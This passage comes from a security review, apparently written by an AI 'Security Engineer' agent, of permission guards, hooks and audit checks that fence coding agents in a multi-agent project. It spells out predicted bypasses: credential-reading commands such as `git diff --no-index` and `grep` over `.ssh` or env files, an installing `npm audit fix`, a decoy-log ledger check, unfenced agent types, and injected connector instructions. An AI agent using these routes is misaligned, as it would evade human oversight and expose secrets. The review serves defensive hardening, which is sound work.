**H-22.** Medium, agreed. Addition to the checklist: when the prompt appears, choose the one-time answer. A "do not ask again" answer writes a standing allow rule into `.claude/settings.local.json`, which is git-ignored and outranks the project file (N-05). Inspect that file afterwards.

**H-23.** Medium in the plan; **high**, and its result must be known before H-01 is designed. QA's record (unverified item 5) notes the extension's main session ran `rm` and `ls`, which the `chief-engineer` allowlist would have refused. If the main session carries no agent type, the orchestrator is the least fenced identity in the system (N-02). Add to the checklist: a shell `touch` from the main session, and an out-of-lane write by a subagent started from the extension (QA's unverified item 3, which the plan does not otherwise cover).

**H-24.** High for operability; **low as a security matter**. No objection to option (b). Wave 1 is fine.

**H-25, search for read-only roles.** Severity: medium, agreed. Closes? It restores search, and **as proposed it opens a secret-reading channel for the three read-only roles**:
- `grep -rn KEY apps/api` reads an env file in that folder; plain `grep` knows nothing of ignore files and no secret name appears in the command.
- `grep -rn PRIVATE <home>/.ssh` and the like: an allowlisted command with a free path argument.
- `git grep --no-index --no-exclude-standard -n KEY` searches ignored files by request.
- Line 70 of `path-guard.mjs` rejects `|`, `$` and `\`, so most useful search expressions cannot be typed, which will create pressure to loosen line 70.
Proposed instead: find out why the Grep and Glob tools are withheld from Bash-holding roles and restore them; they pass through `secret-guard` with structured parameters. If shell search is added anyway, confine its path arguments to the project and resolve H-17 first. Wave 2: right. See also N-07 and N-08 for what the existing allowlist already admits.

**H-26.** Medium, workflow. Security note for the decision: a browser connector driven from the owner's interactive session acts inside whatever the owner is signed in to. If chosen, use a separate browser profile with no saved sessions.

**H-27.** Medium, workflow. Security note: the Figma connector also offers tools that create and modify files. Any allow rule must name the five read tools exactly, as `da-vinci.md:4` does, never the connector prefix.

**H-28.** Low, agreed.

**H-29, connectors and plugin.** Severity: medium in the plan; **high, becomes critical**, and **Wave 1**. The trigger "before any connector is used for project work" misreads the exposure: the tools and their injected instructions are present in agent sessions now. Observed in this session: instruction blocks from four connectors arrived in my context, phrased as imperatives; I treated them as data and called none. Connector tools sit outside all three layers: not in the hook matcher (`settings.json:46, 55`), not in the sandbox, not in the run log. A mail, drive or infrastructure connector is a live credential attached to every agent, which contradicts "no production credentials belong on this machine" the day the store's domain or mail runs through those accounts. The memory plugin persists session content outside the repository and replays it into later sessions; anything an agent reads may be stored there. Proposed: deny connector tools by default for this project and allow by exact name; the fix is a list in `settings.json`.

**H-30.** Low, agreed; but it must run **before** H-04 and H-05 are written, since both add patterns whose matching rules are the thing H-30 tests. Add case sensitivity of the `Read` deny rules (R7's unverified half) to its probes.

### 2.3 Reviewer and QA items the plan misses or under-treats

| Item | State in Proposal B |
|---|---|
| R3, the two stronger options (log outside the repository; append-only) | Not discussed. Under-treated. |
| R9, a guard that fails before its own code runs | H-08 covers exceptions only. Under-treated. |
| R10 | Treated, wrong wave (H-15). |
| R11 | Treated, severity and wave too low (H-16). |
| R12 with QA's W4 | Probe deferred to Wave 2 (H-17). Should be Wave 0. |
| R15, a captured re-run of `secret-guard` firing | Not in any wave. QA's unverified items 8 and 9 (transcript-grade firing; the file-tool branch firing live) are not covered by H-18, H-21 or H-30. Missed. |
| R16b | Treated in H-19, Wave 2, by a self-declared justification. Under-treated. |
| R5, `: > CLAUDE.md` | Not matched by any proposed pattern. Missed. |
| QA unverified 3, a guard denial for a subagent started from the extension | Not in the H-22 or H-23 checklist. Missed. |
| QA unverified 5, `ask` and `deny` for a role other than `devops-sre` | Missed. Low. |
| QA's note that both control trials ran with a command-line Bash allowance, so what an unmatched command does in an ordinary delegated run is unknown | Missed, and it bears on H-01: the starting behaviour the allowlist replaces has not been observed. |
| Addendum G as relayed by QA: the setup session deleted the run log with `rm` | Not mentioned. The rule "nobody deletes the log" has already been broken once, by the kind of session that remains unfenced. |
| W1, the reviewer cannot run the suite it reviews | Treated in H-25, Wave 2. Every Wave 1 change is therefore reviewed by someone who cannot run its tests. |

### 2.4 New weaknesses nobody has raised

All static. None executed.

**N-01. High. An agent type the guard does not know is unrestricted.** `path-guard.mjs:64`: `if (!agent || !(agent in OWNED)) process.exit(0)`. Scenario: a session delegates to a built-in type (the validation record quotes the extension listing `general-purpose`, `Explore`, `Plan` and others as available), or an agent file is added under `.claude/agents/` with a new name (see H-16). That agent writes `.claude/settings.json`, `scripts/`, the run log or any lane, and runs any shell command. The Chief Engineer's own tool line restricts delegation to the nine (`chief-engineer.md:4`), which helps only when the main session really runs as `chief-engineer`. Recommendation: a non-empty agent type that is not a known role is blocked for writes and shell. H-08's `Object.hasOwn` change is correct and does not address this.

**N-02. High. A session with no agent type is treated as the owner.** Same line; `path-guard.mjs:4-5` states it as intent; `test-guards.mjs:65` pins it. The hook cannot tell the owner at the keyboard from a model-driven main session, a nested `claude -p` started from an agent's shell, or any surface where the harness omits the field. QA's record points to the extension main session being in this state. Impact: the session that orchestrates, writes the ledger, runs the checker and saves the reviewer's reports is outside path ownership and outside H-01. Recommendation: settle H-23 first. If the main session carries no agent type, invert the default: no agent type is fenced as `chief-engineer` unless the owner has set a marker in the environment the session was launched from. That is a design choice for the owner.

**N-03. High. The ledger check can be pointed at a different log and a different folder.** `check-feature-ledger.mjs:17-18`; `path-guard.mjs:46`. Scenario in H-11 above; `--dir` at an empty folder gives "0 ledger(s) checked, 0 with problems", exit 0. Impact: H-10, H-11 and H-14 are all bypassed with one Write in the Chief Engineer's own lane and one allowlisted command. Recommendation: the allowlist admits the command with no arguments only; the script prints the resolved log and folder on every run; non-default paths require a flag that makes the run exit non-zero for acceptance purposes.

**N-04. High. For the four building roles, "remove the capability" is not achievable.** Developed under H-01. A role that writes code and runs it has a general shell by another name. The plan's section 1 should say so, and H-02's scope should follow from it.

**N-05. High. A git-ignored file outranks the project settings.** `.gitignore:29` ignores `.claude/settings.local.json`. *To confirm*: by the documented precedence as I recall it, local settings override project settings, including permission rules, hooks and the sandbox block; user-level settings and launch flags are further routes. Scenario: the file is created by a shell today, by an unfenced session's Write, or by the owner choosing "do not ask again" on a prompt. It adds an allow rule or turns the sandbox off. No diff, no audit entry, and H-03 cannot see it. Recommendation: the guard test suite fails if the file exists with anything but an agreed content; H-03 hashes it; the owner checklist inspects it. Real enforcement of "this cannot be overridden" needs managed settings, which is the owner's decision.

**N-06. High, becomes critical. Connector tools are outside every layer.** Developed under H-29.

**N-07. High, becomes critical. Nothing limits reading outside the project, and one allowlisted git command reads any file.** The Read tool is covered only by `secret-guard`'s name test; `path-guard` does not see reads. Any role, including those with no shell, can Read a credentials file in the home directory whose name is not on the list. For the three "read-only" roles, `git diff` is on the allowlist (`path-guard.mjs:42`) and `git diff --no-index <a> <b>` prints the contents of arbitrary files or whole directories, including a directory that contains an env file, with no secret name in the command. Recommendation: under H-07 above. Remove `--no-index` from what the allowlist admits.

**N-08. Medium. The Security Engineer's "read-only" allowlist admits a command that installs.** `path-guard.mjs:48`: `/^(pnpm|npm) audit( |$)/` also matches `npm audit fix --force` and `pnpm audit --fix`, which rewrite the manifest and lockfile and, for npm, install. This is my own role's allowlist; I did not try it. Recommendation: anchor the pattern to the flags actually needed and add a BLOCK case.

**N-09. Medium. The ledger check does not tie a stage to the role that must perform it.** `check-feature-ledger.mjs:24, 49, 75-78`. Inputs: `- [x] security | agent: owner | evidence: reviewed` (line 76 skips the run check for `owner` on any stage); `- [x] security | agent: sage | evidence: x` (any agent with a record satisfies any stage); `- [x] security | agent: , | evidence: x` (the pattern admits a lone comma, line 49 reduces it to an empty list, and the loop at 75 has nothing to check). Recommendation: a fixed map from stage to required agent; `owner` valid only where the template says so; at least one known agent per stage.

**N-10. Medium. Field values are compared exactly and anything else means "no".** `check-feature-ledger.mjs:54, 82, 85`. `accepted: Yes`, `Accepted: yes` or `security-sensitive: Yes` reads as accepted or sensitive to a person and as neither to the script, which then prints `ok`. A missing `security-sensitive` line also means no security stage. Recommendation: every header field is required and must be exactly one of its allowed values; anything else is a failure.

**N-11. Medium. Instruction files inside a role's own lane.** Under H-16. `frontend-engineer` owns everything under `apps/web/`, which would include `apps/web/CLAUDE.md` and a nested `.claude/` folder; `devops-sre` owns `docs/operations/` likewise. *To confirm* that nested instruction files load for other agents working in that folder. If they do, any role can put instructions into another role's context from inside its own lane.

**N-13. Medium. Fail-closed guards and an exit-code-only suite cancel each other.** Under H-08.

**N-15. Medium. Repository plumbing is unprotected.** `.git/config`, `.git/hooks/`, `.gitattributes`, `.vscode/` (ignored at `.gitignore:35`), `.mcp.json`: none is in any proposed protected list. A changed git configuration can make an ordinary `git status` run a program, and H-03 runs `git status` from a hook outside the sandbox. A git hook runs in the owner's unsandboxed shell at the next commit. *To confirm* whether the sandbox protects any of these by default. Recommendation: add them to `denyWrite` and to the protected-path check explicitly, and have H-03's hook run git with its configuration-driven helpers disabled.

**N-16. Medium.** `.gitignore` is in `devops-sre`'s lane (`path-guard.mjs:32`). Editing it can hide paths from every git-based check and can stop ignoring env files. It belongs with the manifests in H-04.

**N-17. Medium. Nothing inspects content, and the first commit will contain everything.** Secret protection is by file name only. No hook looks at what is written and no scan runs before a commit. The evidence transcripts under `docs/testing/evidence/` record account-level details from connector calls (the validation record describes one such result). I did not read those files. Recommendation: before the owner's first commit, and certainly before a first push, somebody reads them for tokens, account identifiers and personal data; and a secret scan is in place before any remote exists.

**N-18. Medium. Who implements Proposal B, and how is it reviewed?** No named role can write `.claude/` or `scripts/`, so the changes must be made by a session the guards do not fence. The procedure says "have the Independent Reviewer read the diff"; with no commit there is no diff to read. The reviewer cannot run the suite until H-25, in Wave 2. And for a proposal the Chief Engineer wrote, the Chief Engineer also saves the reviewer's verdict, since the reviewer holds no write tool. Recommendation: owner's commit first; the plan names the implementing session and the owner watches it; the reviewer's verdict on this plan reaches the owner directly, by a reviewer session the owner runs, not through a file the reviewed party writes.

**N-19. Low.** `path-guard.mjs:80` and `log-agent-run.mjs:16` fall back to the session's working directory when the project variable is unset, which would move both the ownership root and the log. `check-feature-ledger.mjs:98-100` exits 0 when the ledger folder is missing, and line 106 skips any file beginning with `_` and any sub-folder. The log record has no start time.

**N-21. Medium.** The sandbox assumptions listed under H-02.

### 2.5 The three-layer strategy

**Is it sound?** The ordering is right, and the distinction in section 1 between matching text and enforcing on the filesystem is the most useful sentence in the plan. Section 5's admission that the controls are for mistakes, not for an agent trying to defeat them, is honest. The strategy is sound as a direction. It is not yet a design, for these reasons:

1. **Layer 1 holds only for roles that cannot run what they write.** That is the Chief Engineer, the reviewer and the Security Engineer. For the four building roles it narrows typing errors and leaves the capability (N-04).
2. **Layer 2 is scoped to four paths and to writes.** No read protection, no network position, nothing for other lanes, the approval rules file, the manifests or the repository's own plumbing (H-02, N-15).
3. **The file tools are outside the sandbox**, as the plan says. Their only control is `path-guard`, which is regular expressions over a path string: no link resolution (H-15), no case folding (H-16), default-allow for unknown callers (N-01, N-02), and open when it fails to start (H-08).
4. **The hooks are files in the tree they guard.** Today four roles can rewrite them from a shell, and with no commit nobody could tell. After Wave 1, the unfenced sessions still can with the Write tool. Nothing verifies that the hook that ran is the hook that was reviewed.
5. **The main session has no agent type, or may not** (N-02). The strategy has no layer for it.
6. **Settings above the project file** can switch layers off without a trace (N-05).
7. **Connector tools** pass through none of the layers (N-06).
8. **Layer 3 sees names, not content**, sees nothing that git ignores, and reports to the party it audits (H-03).
9. **The threat model stops at "cooperative agents".** A cooperative agent that reads hostile text, from a package readme, a fetched page, a connector result or, later, customer-supplied content, is no longer reliably cooperative. That is why the controls the plan calls "decisive" in section 5 (no production credential on this machine, branch protection, the owner reading evidence) matter most, and none of them is a checkable item in any wave. Proposed: add a Wave 1 item that makes "no production credential is reachable from this machine or from any attached connector" a checklist the owner runs.

### 2.6 Section 4

**The design tier.** Reasonable, and better than a false tick on `implementation`. Four weaknesses:
- It is self-declared, like every tier. A change that touched code can be filed as `design` and skip `qa` and `implementation`. The checker should verify, from what the cited runs changed (H-03), that a `design` ledger touched only documentation paths. Without that, the tier is a new downgrade door beside `trivial`.
- `security-sensitive` stays a typed word (H-19, N-10). For this tier in particular the SRE phase is security-sensitive by its own brief; consider making the security stage a fixed part of `design` unless the Security Engineer records otherwise.
- No stage for the Software Architect, although the phase has six decision records by that role. A comma list on `authoring` works, subject to N-09.
- `trivial` plus `accepted: yes` becoming an error is right. `trivial` still returns before every other check.
Ordering: the plan wants H-13 before the SRE phase is accepted, yet places it at step 4 of Wave 1 "together" with H-09, H-10, H-11 and H-14. If the phase starts first, H-13 has to be pulled forward alone; say which.

**Run-id binding.** Assessed under H-14. Worth doing, incomplete as written, and it proves that a run ended, not what it did.

**"Nobody deletes, truncates or edits the run log."** Stricter than the reviewer's "truncate, by the owner", and I prefer it: keeping the probe records costs nothing once stages bind to ids. But it is a rule with three gaps: it is unenforced for the unfenced sessions; it has already been broken once (2.3); and nothing would detect a breach, since the file is ignored by git and has no internal continuity. Proposed: the previous-record hash in each line, and the owner noting the current last line's hash in a committed file when a phase opens.

**The interim rule (`started` no earlier than 2026-10-12).** It is a date typed by the Chief Engineer into a file the checker will not read while the phase is tracked by hand, so for the SRE phase it does nothing mechanical. It also excludes the genuine runs of 2026-10-11 and admits any trivial run made on or after the 12th. Acceptable as a stop-gap if described as one.

**Hand tracking.** Honest, and the label "tracked by hand; not machine-checked" is right. Two snags: the file cannot later be moved "unchanged", because H-14 changes the stage-line format and no agent may run `mv`; and it collides with Proposal A's criterion 2 (SA-14).

### 2.7 Wave placement, summarised

| Finding | Plan | My view |
|---|---|---|
| Owner's initial commit or hash baseline; scan of evidence files first (SA-02, N-17) | absent | Before Wave 0 results are relied on, and before Wave 1 starts |
| H-23, with a subagent denial from the extension | 0, medium | 0, high; gates the design of H-01 |
| H-30, plus case sensitivity of `Read` deny | table 2 | 0; before H-04 and H-05 |
| H-17 probe | 2 | 0 |
| R15 captured re-run; file-tool branch firing live | absent | 0 |
| Sandbox assumptions (N-21) | inside H-02 | 0, as a written checklist |
| H-15 | 2 | 1 |
| H-16, widened (N-11) | 2 | 1 |
| H-29 (N-06) | 2 | 1 |
| H-19 (b) | 2 | Before the first product feature |
| N-01, N-02, N-03, N-05, N-07 | absent | 1 |
| N-08, N-09, N-10, N-13, N-15, N-16 | absent | 1, with the files they touch |
| H-20 | 0 | Not a no-change item; needs approval like the rest |
| H-01, H-02, H-03, H-04, H-05, H-06, H-07, H-08, H-09, H-10, H-11, H-12, H-13, H-14, H-24 | 1 | 1 |
| H-18, H-21, H-22, H-27 test, H-28 | 0 | 0 |
| H-25, H-26 | 2 | 2 |

---

## 3. All findings, ranked

No critical finding. "Becomes critical" means: if still open when a live credential or customer data is reachable from this machine.

| Rank | ID | One line | Where |
|---|---|---|---|
| High | SA-01 | `devops-sre` keeps an unrestricted shell in a documentation phase; the fence is prose | Proposal A s.5; `path-guard.mjs:45-49, 68` |
| High | SA-02 | No commit, so no check can show an edit, including to the guards | Proposal A criteria 2, 3 |
| High | N-01 | Unknown agent types are unrestricted | `path-guard.mjs:64` |
| High | N-02 | A session with no agent type is treated as the owner; the main session is probably one | `path-guard.mjs:4-5, 64` |
| High | N-03 | The ledger check accepts a substitute log and folder | `check-feature-ledger.mjs:17-18`; `path-guard.mjs:46` |
| High | N-04 | Build and test commands are a general code runner; layer 1 does not remove the capability | Proposal B s.1, H-01 |
| High | N-05 | Git-ignored local settings outrank the project's and are invisible | `.gitignore:29` |
| High, becomes critical | N-06 / H-29 | Connector tools and injected instructions are outside every layer | `settings.json:46, 55` |
| High, becomes critical | N-07 | Reads outside the project are unlimited; `git diff --no-index` reads any file | `path-guard.mjs:42`; `secret-guard.mjs:9-14` |
| High, becomes critical | SA-03 | Webhook secret handling, idempotency durability and payment scope not required | Proposal A areas A to E |
| High, becomes critical | SA-04 | Signed-link key management and egress abuse not required | Proposal A area F q.5 |
| High, becomes critical | SA-05 | Backup deletion rights, key custody and restore target are optional and unchecked | Proposal A area D |
| High | H-16 as re-rated | Any-depth patterns may let QA add rules or agents under `.claude/` | `path-guard.mjs:21-23, 29` |
| High | H-23 as re-rated | Whether the main session is fenced is unknown and gates the design | `settings.json:2` |
| High | H-19 (b) as re-rated | The mandatory security review is switched on by a typed word | `check-feature-ledger.mjs:85` |
| High until probed | H-17 | Search may return secret-file lines; the `glob` parameter and non-content modes | `secret-guard.mjs:37-45` |
| Medium | H-14 | Run-id binding as written accepts a probe id | Proposal B H-14, s.4 |
| Medium | N-08 | `audit` allowlist admits `audit fix` | `path-guard.mjs:48` |
| Medium | N-09 | No stage-to-agent binding; `owner` or an empty list on any stage | `check-feature-ledger.mjs:24, 49, 75-78` |
| Medium | N-10 | `Yes` is read as no; missing field means no security stage | `check-feature-ledger.mjs:54, 82, 85` |
| Medium | N-11 | Nested instruction files inside a role's own lane | `path-guard.mjs:15-16, 28` |
| Medium | N-13 | Fail-closed guards make exit-code-only BLOCK tests pass vacuously | `test-guards.mjs:20-24, 32` |
| Medium | N-15, N-16 | `.git/` configuration, hooks, `.vscode/`, `.mcp.json`, `.gitignore` unprotected | `path-guard.mjs:32`; Proposal B H-02, H-03 |
| Medium | N-17 | Name-only secret control; first commit includes unread evidence transcripts | `secret-guard.mjs`; `docs/testing/evidence/` |
| Medium | N-18 | No implementer, no diff, reviewer cannot run tests, reviewed party saves the verdict | Proposal B s.2 |
| Medium | N-21 | Sandbox behaviour the plan depends on is unconfirmed; its own safe test is invalid after H-01 | Proposal B H-02 |
| Medium | H-15 | Workspace links defeat ownership without a shell; wrong wave | `path-guard.mjs:81` |
| Medium | H-25 | Proposed shell search reads secret files | Proposal B H-25 |
| Medium | SA-06 to SA-13, SA-16 | Audit log, personal data, CI supply chain, admin access, review coverage, monitoring, env handling, uncheckable criteria, connectors in the fence | Proposal A |
| Low | SA-14, SA-15, SA-17, SA-18, N-19, H-21 note, H-22 note | See text | |

## 4. What I reviewed and what I did not

**Reviewed (Read tool, in full unless stated):** `CLAUDE.md`; `.claude/rules/security.md`; Proposal A; Proposal B; the Independent Reviewer's report; `docs/testing/setup-validation.md` from line 150 to the end (which includes the required section); `.claude/settings.json`; the three hooks; both scripts; `.gitignore`; `docs/status/features/_TEMPLATE.md`; and, to check citations, the head of `SKILL.md` and of five agent files (`chief-engineer`, `qa-test-engineer`, `da-vinci`, `devops-sre`, `security-engineer`).

**Not reviewed:** the evidence bundle and its addendum; the run log itself; the other five agent files; the other rule files; `docs/learning/`; the first 149 lines of the validation record; any Claude Code documentation or release note; anything outside the repository.

**Limits.** This is a reading of documents and of about 400 lines of guard code. I executed nothing, so every weakness in section 2 is a prediction with a stated input, and some rest on harness behaviour marked *to confirm*. I may be wrong about any of those. A code-level reading cannot show how the harness treats a hook exit code, a settings conflict, a sandbox key or a search over ignored files; only the owner's Wave 0 probes can. Nothing here says the organization's controls are secure, or that they would be after either proposal. It says where, on reading, they do not do what the proposals say they do.

## 5. Specialist report

**1. Status:** done. One review written; no finding fixed, nothing approved.

**2. Files changed:** `docs/security/proposals-security-review-2026-10-11.md` (this file, created). No other file was created, edited, moved or deleted.

**3. Commands run:** none. No shell command was run, on instruction. Tools used: Read (19 files, listed in section 4) and Write (once). No guard was probed or tested.

**4. Not verified:**
- Every guard weakness in section 2: static analysis, not executed.
- Every statement marked *to confirm* about Claude Code's own behaviour: settings precedence, sandbox keys and defaults, recursive loading of rule and agent folders, nested instruction files, how the search tool treats ignored files and its `glob` parameter, how a hook timeout or a non-2 exit is handled, whether a launch flag can remove a tool from a delegated run.
- Whether the working directory is a git repository. This session's environment description says it is not; the reviewer's report shows `git status` succeeding. Not resolved here.
- Whether `docs/design/` holds only a readme, and the contents of the evidence files and the run log: not read.
- Whether the guard suite passes: not run.
- Five of the ten agent files behind the `.claude/agents/*.md:4` citation.

**5. Decisions and deviations:**
- I wrote this file because the brief required exactly one file at this path and my role records reviews in `docs/security/`. A general instruction in my session configuration discourages writing report files; the specific brief took precedence.
- I read seven files beyond the brief's list, and the validation record from line 150 instead of from the named heading, solely to check citations in H-13, H-16, H-22, H-25, H-26 and H-27.
- I re-rated H-16, H-17, H-19 (b), H-23 and H-29 upward and H-24 downward as a security matter, with reasons in 2.2.
- I rated nothing critical, because no asset exists yet. I marked five findings "becomes critical" so the rating is not read as permanent.
- Connector instruction blocks present in my session were treated as data. I called no connector tool.
- Where QA and the reviewer disagree (W3, W4, W5), I side with QA that the harness-dependent halves are unproven, and with the reviewer that they should be treated as high until probed.

**6. Needs the owner:**
1. **Escalation, as my role requires:** this review contains high findings in both proposals. None is critical today.
2. **Proposal A:** approve only with the five amendments in 1.5. The first two (no shell for `devops-sre`, enforced; a commit or hash baseline) are the ones I would not waive.
3. **Proposal B:** Wave 0 may proceed with the additions in 2.7. Ask for Wave 1 to be revised against sections 2.1 to 2.6 before approving it.
4. **An owner action that unblocks both:** an initial commit, after somebody has read the evidence transcripts for account details (N-17), and one owner-run command to settle whether this directory is a git repository.
5. **A decision only the owner can make:** which connectors stay attached to sessions that work on this project (H-29, N-06), and whether a session with no agent type should be fenced by default (N-02).
6. **A request about process:** for a proposal written by the Chief Engineer, have the Independent Reviewer's verdict reach you directly, not through a file the Chief Engineer saves (N-18).
